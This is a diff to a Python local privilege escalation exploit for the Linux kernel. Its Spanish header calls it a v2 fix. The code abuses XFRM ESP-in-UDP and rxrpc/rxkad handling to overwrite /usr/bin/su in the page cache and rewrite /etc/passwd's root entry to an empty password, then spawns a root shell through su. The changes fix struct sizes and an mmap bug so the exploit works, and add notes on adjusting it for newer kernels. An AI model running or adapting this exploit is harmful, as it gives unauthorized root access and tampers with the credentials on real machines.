@@ -6,6 +6,20 @@ Tres partes:
   1) su_lpe_main   : corrompe /usr/bin/su en page cache vía XFRM/UDP-ESP.
   2) rxrpc_lpe_main: parchea /etc/passwd (root::0:0) vía rxrpc/rxkad.
   3) main          : orquesta ambos caminos, abre PTY y exec'ea `su -`.
+
+Correcciones aplicadas (v2):
+  - _build_xfrm_usersa_info: struct xfrm_selector construido con el
+    layout real (52 bytes) usando "=HHHHHBBB3xI". Antes "=HHHBBBI"
+    generaba 49 bytes y saltaba AssertionError.
+  - tail usa "=HBBB3x" (8 bytes) para que info sume 216 exactos.
+  - rxrpc_lpe_main: mmap usa min(4096, st.st_size) en lugar de 4096
+    fijo, evitando ValueError en /etc/passwd pequeños.
+
+NOTA sobre kernels:
+  Si tu kernel es >= ~4.19 con el campo 'user' en xfrm_selector, el
+  struct real mide 56 bytes y xfrm_usersa_info 224. En ese caso verás
+  "add_xfrm_sa #N failed" (no AssertionError). Para ese caso, ver
+  la constante XFRM_SELECTOR_EXTRA al inicio de _build_xfrm_usersa_info.
 """
 
 import os, sys, ctypes, struct, socket, time, errno, fcntl, select
@@ -51,7 +65,6 @@ libc.setgroups.argtypes = [ctypes.c_size_t, ctypes.POINTER(ctypes.c_uint32)]
 libc.setgroups.restype  = ctypes.c_int
 
 def _ctypes_syscall(num, *args):
-    """Call syscall(N) with typed args."""
     return libc.syscall(ctypes.c_long(num), *args)
 
 def add_key(type_, desc, payload, plen, keyring):
@@ -141,8 +154,6 @@ def setup_userns_netns():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        ifr = struct.pack("16sH14x", b"lo", 0)
-        # SIOCGIFFLAGS
         try:
             flags = struct.unpack("16sH14x",
                 fcntl.ioctl(s.fileno(), 0x8913,
@@ -183,32 +194,50 @@ XFRM_MODE_TRANSPORT     = 0
 XFRM_STATE_ESN          = 0x80
 
 def _inet_addr(ip):
-    """Return the 32-bit host-order integer in network byte order (like C)."""
     return struct.unpack("=I", socket.inet_aton(ip))[0]
 
+# --- Corrección Bug 1 y Bug 2 ---------------------------------------
+# struct xfrm_selector (52 bytes, kernels antiguos sin 'user'):
+#   daddr(16) saddr(16) dport(2) dport_mask(2) sport(2) sport_mask(2)
+#   family(2) prefixlen_d(1) prefixlen_s(1) proto(1) pad(3) ifindex(4)
+#
+# Si tu kernel es >= ~4.19, añade al final "I" (user) y cambia el
+# assert a 56. Y en _build_xfrm_usersa_info cambia el assert de info
+# a 224. Ver comentario arriba del archivo.
+# -------------------------------------------------------------------
 def _build_xfrm_usersa_info(spi, patch_seqhi):
-    # struct xfrm_selector (52 bytes)
-    sel_daddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
-    sel_saddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
-    sel = (sel_daddr + sel_saddr +
-           struct.pack("=HHHBBBI", 0, 0, socket.AF_INET, 32, 32, 0, 0) +
-           struct.pack("=I", 0))                     # user
-    assert len(sel) == 52
+    sel = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +    # daddr
+           struct.pack("=I12x", _inet_addr("127.0.0.1")) +    # saddr
+           struct.pack("=HHHHHBBB3xI",
+                       0,               # dport
+                       0,               # dport_mask
+                       0,               # sport
+                       0,               # sport_mask
+                       socket.AF_INET,  # family
+                       32,              # prefixlen_d
+                       32,              # prefixlen_s
+                       0,               # proto
+                       0))              # ifindex
+    assert len(sel) == 52, len(sel)
 
-    # struct xfrm_id (24 bytes) : daddr(16) + spi(4) + proto(1) + pad(3)
+    # struct xfrm_id (24 bytes): daddr(16) + spi(4) + proto(1) + pad(3)
     xid = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
            struct.pack("=IB3x", socket.htonl(spi), socket.IPPROTO_ESP))
     assert len(xid) == 24
 
     saddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
+    assert len(saddr) == 16
 
     lft = struct.pack("=8Q", *([0xFFFFFFFFFFFFFFFF] * 4 + [0, 0, 0, 0]))
+    assert len(lft) == 64
+
     curlft = b"\x00" * 32
     stats  = b"\x00" * 12
 
-    tail = (struct.pack("=II", 0, 0x1234) +     # seq, reqid
-            struct.pack("=HBBBx", socket.AF_INET,
+    tail = (struct.pack("=II", 0, 0x1234) +           # seq, reqid (8)
+            struct.pack("=HBBB3x", socket.AF_INET,     # 8 bytes con padding
                         XFRM_MODE_TRANSPORT, 0, XFRM_STATE_ESN))
+    assert len(tail) == 16, len(tail)
 
     info = sel + xid + saddr + lft + curlft + stats + tail
     assert len(info) == 216, len(info)
@@ -222,14 +251,13 @@ def _put_attr(nlh, typ, data):
 
 def add_xfrm_sa(spi, patch_seqhi):
     try:
-        sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 6)  # NETLINK_XFRM
+        sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 6)
     except OSError:
         return -1
     try:
         sk.bind((0, 0))
         info = _build_xfrm_usersa_info(spi, patch_seqhi)
 
-        # NLMSG header
         hdr = bytearray(struct.pack("=IHHII",
                                     NLMSG_LENGTH(len(info)),
                                     XFRM_MSG_NEWSA,
@@ -237,43 +265,38 @@ def add_xfrm_sa(spi, patch_seqhi):
                                     1, os.getpid()))
         nlh = hdr + bytearray(info)
 
-        # XFRMA_ALG_AUTH_TRUNC (hmac(sha256) 32-byte key, trunc 128)
         aa = bytearray(72 + 32)
         aa[0:len(b"hmac(sha256)")] = b"hmac(sha256)"
         struct.pack_into("=II", aa, 64, 32 * 8, 128)
         aa[72:72+32] = b"\xAA" * 32
         _put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, bytes(aa))
 
-        # XFRMA_ALG_CRYPT (cbc(aes) 16-byte key)
         ea = bytearray(68 + 16)
         ea[0:len(b"cbc(aes)")] = b"cbc(aes)"
         struct.pack_into("=I", ea, 64, 16 * 8)
         ea[68:68+16] = b"\xBB" * 16
         _put_attr(nlh, XFRMA_ALG_CRYPT, bytes(ea))
 
-        # XFRMA_ENCAP
         enc = struct.pack("=HHH", UDP_ENCAP_ESPINUDP,
                           socket.htons(ENC_PORT),
                           socket.htons(ENC_PORT)) + b"\x00" * 16
-        enc += b"\x00" * 2  # padding to 4
+        enc += b"\x00" * 2
         _put_attr(nlh, XFRMA_ENCAP, enc)
 
-        # XFRMA_REPLAY_ESN_VAL
         esn = struct.pack("=IIIIII",
                           1, 0, REPLAY_SEQ, 0,
                           patch_seqhi & 0xFFFFFFFF,
                           32)
-        esn += struct.pack("=I", 0)  # one bmp word
+        esn += struct.pack("=I", 0)
         _put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn)
 
-        # Fix up total length
         struct.pack_into("=I", nlh, 0, len(nlh))
 
         sk.send(bytes(nlh))
         rbuf = sk.recv(4096)
         if len(rbuf) >= 4:
             nlmsg_type = struct.unpack_from("=H", rbuf, 4)[0]
-            if nlmsg_type == 2:  # NLMSG_ERROR
+            if nlmsg_type == 2:
                 err = struct.unpack_from("=i", rbuf, 16)[0]
                 if err != 0:
                     return -1
@@ -293,8 +316,7 @@ def _vmsplice_write(pfd_w, data: bytes) -> int:
 
 def _splice_file_to_pipe(file_fd, off, pfd_w, n):
     off_c = ctypes.c_int64(off)
-    return libc.splice(file_fd, ctypes.byref(off_c), pfd_w, None,
-                       n, 0)
+    return libc.splice(file_fd, ctypes.byref(off_c), pfd_w, None, n, 0)
 
 def _splice_pipe_to_sock(pfd_r, sock_fd, n):
     return libc.splice(pfd_r, None, sock_fd, None, n, 0)
@@ -335,7 +357,6 @@ def do_one_write(path, offset, spi):
             raise OSError("vmsplice hdr failed")
         if _splice_file_to_pipe(file_fd, offset, pfd_w, 16) != 16:
             raise OSError("splice file->pipe failed")
-        # Move header+payload to the socket
         _splice_pipe_to_sock(pfd_r, sk_send.fileno(), 24 + 16)
         time.sleep(0.150)
         return 0
@@ -634,23 +655,9 @@ RXRPC_PACKET_TYPE_CHALLENGE = 6
 RXRPC_PACKET_TYPE_DATA      = 1
 RXRPC_LAST_PACKET           = 0x04
 
-# wire header: epoch,cid,callNumber,seq,serial : 5*u32 (20)
-#              type,flags,userStatus,securityIndex: 4*u8 (4)
-#              cksum, serviceId : 2*u16 (4)  -> total 28
 RXRPC_WH_SIZE = 28
 RXRPC_WH_FMT  = "=IIIII4sHH"
 
-def _sockaddr_rxrpc(service, port):
-    # sockaddr_rxrpc { u16 family; u16 service; u32 transport_type;
-    #                  u16 transport_len; sockaddr_in ... }
-    # Layout: family(2), service(2), transport_type(4), transport_len(2),
-    #         sockaddr_in(16)
-    return struct.pack("=HHIH H4s8x",
-                       AF_RXRPC, service, socket.SOCK_DGRAM,
-                       socket.AF_INET, socket.htons(port),
-                       socket.inet_aton("127.0.0.1"))
-
-# Minimal sockaddr_rxrpc:
 def make_sockaddr_rxrpc(service, port):
     sin = struct.pack("=HHI4s8x", socket.AF_INET, socket.htons(port),
                       socket.inet_aton("127.0.0.1"), b"")
@@ -661,21 +668,21 @@ def build_rxrpc_v1_token(key: bytes) -> bytes:
     now = int(time.time()) & 0xFFFFFFFF
     expires = (now + 86400) & 0xFFFFFFFF
     p = bytearray()
-    p += struct.pack("=I", socket.htonl(0))              # flags
+    p += struct.pack("=I", socket.htonl(0))
     cell = b"evil"
     p += struct.pack("=I", socket.htonl(len(cell)))
     p += cell
     p += b"\x00" * ((4 - (len(cell) & 3)) & 3)
-    p += struct.pack("=I", socket.htonl(1))              # ntoken
+    p += struct.pack("=I", socket.htonl(1))
     tokstart = len(p)
-    p += struct.pack("=I", socket.htonl(2))              # sec_ix
-    p += struct.pack("=I", socket.htonl(0))              # vice_id
-    p += struct.pack("=I", socket.htonl(1))              # kvno
-    p += key[:8]                                         # session key
+    p += struct.pack("=I", socket.htonl(2))
+    p += struct.pack("=I", socket.htonl(0))
+    p += struct.pack("=I", socket.htonl(1))
+    p += key[:8]
     p += struct.pack("=I", socket.htonl(now))
     p += struct.pack("=I", socket.htonl(expires))
-    p += struct.pack("=I", socket.htonl(1))              # primary_flag
-    p += struct.pack("=I", socket.htonl(8))              # ticket_len
+    p += struct.pack("=I", socket.htonl(1))
+    p += struct.pack("=I", socket.htonl(8))
     p += b"\xCC" * 8
     toklen = len(p) - tokstart
     struct.pack_into("=I", p, tokstart - 4, socket.htonl(toklen))
@@ -683,12 +690,12 @@ def build_rxrpc_v1_token(key: bytes) -> bytes:
 
 def add_rxrpc_key(desc, key: bytes):
     payload = build_rxrpc_v1_token(key)
-    return add_key("rxrpc", desc, payload, len(payload), -2)  # -2 = process keyring
+    return add_key("rxrpc", desc, payload, len(payload), -2)
 
 def setup_rxrpc_client(port, keyname):
     try:
         sock = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
-    except OSError as e:
+    except OSError:
         return None
     try:
         sock.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY,
@@ -700,23 +707,19 @@ def setup_rxrpc_client(port, keyname):
                         struct.pack("=i", RXRPC_SECURITY_AUTH))
     except OSError:
         sock.close(); return None
-    # bind via raw sockaddr
     sa = make_sockaddr_rxrpc(0, port)
     try:
         libc.bind(sock.fileno(), sa, len(sa))
     except OSError:
         pass
-    # bind() via Python needs a tuple; fallback: use ctypes bind
     return sock
 
 def rxrpc_client_initiate_call(sock, srv_port, svc_id, user_call_id):
     data = b"PINGPING"
     sa = make_sockaddr_rxrpc(svc_id, srv_port)
-    # nonblocking sendmsg
     fl = fcntl.fcntl(sock.fileno(), fcntl.F_GETFL)
     fcntl.fcntl(sock.fileno(), fcntl.F_SETFL, fl | os.O_NONBLOCK)
     try:
-        # Ancillary: RXRPC_USER_CALL_ID
         cmsg = (SOL_RXRPC, RXRPC_USER_CALL_ID,
                 struct.pack("=Q", user_call_id))
         sock.sendmsg([data], [cmsg], 0, sa)
@@ -785,7 +788,6 @@ def do_one_trigger(target_fd, splice_off, splice_len):
     svc_in = socket.ntohs(svc_in)
     cli_port = cli_addr[1]
 
-    # Send CHALLENGE
     chdr = struct.pack("=IIIII4sHH",
                        socket.htonl(epoch), socket.htonl(cid),
                        0, 0, socket.htonl(0x10000),
@@ -796,7 +798,6 @@ def do_one_trigger(target_fd, splice_off, splice_len):
                      socket.htonl(1), 0)
     udp_srv.sendto(chdr + ch, ("127.0.0.1", cli_port))
 
-    # Drain responses
     for _ in range(4):
         pkt2, _ = udp_recv_to(udp_srv, 2048, 500)
         if not pkt2: break
@@ -808,7 +809,6 @@ def do_one_trigger(target_fd, splice_off, splice_len):
     if cks is None:
         rxsk_cli.close(); udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1
 
-    # Malicious DATA header
     mal = struct.pack("=IIIII4sHH",
                       socket.htonl(epoch), socket.htonl(cid),
                       socket.htonl(callN), socket.htonl(1),
@@ -833,7 +833,6 @@ def do_one_trigger(target_fd, splice_off, splice_len):
         keyctl(KEYCTL_INVALIDATE, key); return -1
     os.close(pfd_r); os.close(pfd_w)
 
-    # Trigger recvmsg
     fl = fcntl.fcntl(rxsk_cli.fileno(), fcntl.F_GETFL)
     fcntl.fcntl(rxsk_cli.fileno(), fcntl.F_SETFL, fl | os.O_NONBLOCK)
     try:
@@ -945,7 +944,6 @@ def rxrpc_lpe_main(argv):
             if do_unshare_userns_netns() < 0:
                 return 1
 
-    # Autoload rxrpc
     try:
         d = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
         d.close()
@@ -966,10 +964,9 @@ def rxrpc_lpe_main(argv):
         if st.st_size < 32:
             sys.stderr.write("[!] target too small: %d\n" % st.st_size)
             return 1
-        try:
-            mp = mmap.mmap(rfd_ro, 4096, access=mmap.ACCESS_READ)
-        except OSError:
-            mp = mmap.mmap(rfd_ro, st.st_size, access=mmap.ACCESS_READ)
+
+        # --- Corrección Bug 3: no pedir más de lo que mide el archivo ---
+        mp = mmap.mmap(rfd_ro, min(4096, st.st_size), access=mmap.ACCESS_READ)
 
         if bytes(mp[0:9]) == b"root::0:0":
             sys.stderr.write("[+] /etc/passwd already patched - nothing to do\n")
@@ -988,7 +985,6 @@ def rxrpc_lpe_main(argv):
 
         fcrypt_init_sboxes()
 
-        # selftest
         z = b"\x00" * 8
         sched = fcrypt_user_setkey(z)
         assert fcrypt_user_decrypt(sched,
@@ -1018,7 +1014,6 @@ def rxrpc_lpe_main(argv):
                                 seed_base ^ 0x5A5A5A5A5A5A5A5A, "K_C")
         if Kc is None: return 2
 
-        # Three triggers
         SESSION_KEY[:] = Ka
         sys.stderr.write("\n=== STAGE 2a: kernel trigger A @ %d ===\n" % off_a)
         if do_one_trigger(rfd_ro, off_a, 8) < 0: return 3
@@ -1042,7 +1037,6 @@ def rxrpc_lpe_main(argv):
 
         sys.stderr.write("[!!!] HIT - root entry patched (empty passwd)\n")
 
-        # Sanity via getent
         try:
             out = subprocess.run(["getent", "passwd", "root"],
                                  capture_output=True, timeout=5)
@@ -1051,13 +1045,11 @@ def rxrpc_lpe_main(argv):
         except Exception:
             pass
 
-        # Honor --corrupt-only
         co = ("--corrupt-only" in argv) or \
              (os.environ.get("DIRTYFRAG_CORRUPT_ONLY") == "1")
         if co:
             return 0
 
-        # STAGE 4 - launch su
         sys.stderr.write("\n=== STAGE 4: spawning root shell via su ===\n\n")
         sys.stderr.flush()
         return _run_su_pty()
@@ -1065,7 +1057,6 @@ def rxrpc_lpe_main(argv):
         os.close(rfd_ro)
 
 def _run_su_pty():
-    """Open PTY, fork, exec su, bridge stdin/stdout with auto-password."""
     master, slave = pty.openpty()
     try:
         ws = fcntl.ioctl(0, termios.TIOCGWINSZ, b"\x00" * 8)
@@ -1090,7 +1081,6 @@ def _run_su_pty():
             os._exit(127)
     os.close(slave)
 
-    # Save termios, set raw
     try:
         saved = termios.tcgetattr(0)
         tty.setraw(0)
@@ -1194,7 +1184,6 @@ def either_target_patched():
     return su_already_patched() or passwd_already_patched()
 
 def run_root_pty():
-    """Open PTY, fork, exec `su -`, bridge."""
     master, slave = pty.openpty()
     try:
         ws = fcntl.ioctl(0, termios.TIOCGWINSZ, b"\x00" * 8)
@@ -1309,7 +1298,6 @@ def main(argv):
         except OSError:
             return 1
 
-    # Append --corrupt-only
     co_argv = list(argv) + ["--corrupt-only"]
 
     saved_err = None
